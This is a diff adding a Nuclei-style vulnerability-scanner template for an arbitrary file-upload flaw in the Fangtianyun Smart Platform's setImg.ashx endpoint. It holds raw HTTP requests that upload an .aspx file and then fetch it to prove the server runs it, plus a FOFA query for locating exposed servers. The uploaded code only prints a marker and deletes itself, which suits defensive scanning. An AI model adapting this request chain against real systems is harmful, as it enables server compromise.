@@ -1,0 +1,51 @@
+id: fangdee-setimg-file-upload
+
+info:
+  name: Fangtianyun Smart Platform setImg.ashx File Upload Vulnerability
+  author: Co5mos
+  severity: critical
+  description: |
+    Fangtianyun Smart Platform system's setImg.ashx endpoint has an arbitrary file upload vulnerability, allowing attackers to upload and execute malicious files, leading to complete server compromise.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%96%B9%E5%A4%A9%E4%BA%91%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9FsetImg.ashx%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: 'body="AjaxMethods.asmx/GetCompanyItem"'
+  tags: fangdee, file-upload, rce
+
+variables:
+  filename: "{{rand_base(6)}}.aspx"
+  boundary: "{{rand_base(29)}}"
+
+http:
+  - raw:
+      - |
+        POST /Data/setImg.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><%Response.Write("{{randstr}}");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------{{boundary}}--
+      
+      - |
+        GET /UploadFile/CustomerFile/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        regex:
+          - '(.*\.aspx)'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2, '{{randstr}}')
+        condition: and
